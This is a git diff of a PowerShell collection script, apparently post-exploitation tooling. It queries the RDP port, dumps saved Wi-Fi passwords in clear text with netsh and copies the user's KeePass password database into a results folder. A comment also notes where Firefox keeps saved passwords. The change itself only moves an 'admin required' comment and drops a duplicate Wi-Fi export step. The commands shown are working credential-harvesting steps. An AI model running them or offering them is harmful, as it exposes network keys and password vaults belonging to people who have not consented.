@@ -125,7 +125,7 @@ echo "**** RDP Port****" | Out-File $results\test.txt -Append
 reg query "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber | Out-File $results\test.txt -Append
 echo `r`n | Out-File $results\test.txt -Append
 
-# Dump Wireless passwords in clear. Wireless adapter has to be enabled.
+# Dump Wireless passwords in clear. Wireless adapter has to be enabled. Must be run as admin.
 $wlans = netsh wlan show profiles | Select-String -Pattern "All User Profile" | Foreach-Object {$_.ToString()}
 $exportdata = $wlans | Foreach-Object {$_.Replace("    All User Profile     : ",$null)}
 $exportdata | ForEach-Object {netsh wlan show profiles name="$_" key=clear}
@@ -203,10 +203,6 @@ echo `r`n | Out-File $results\test.txt -Append
         •signons3.txt - 3.0 and above - Encrypted saved passwords (and URL exceptions where "NEVER SAVE PASSWORD" is selected), requires key3.db to work
         •signons.sqlite - 3.5 and above - Encrypted saved passwords (and URL exceptions where "NEVER SAVE PASSWORD" is selected), requires key3.db to work.
         #>
-
-    # Wifi password stored. Must be run as admin.
-    netsh wlan export profile key=clear folder=$results\Wireless
-    echo `r`n | Out-File $results\test.txt -Append
 
     # KeePass
     Copy-Item C:\Users\$user\AppData\Roaming\KeePass\* $results\KeePass
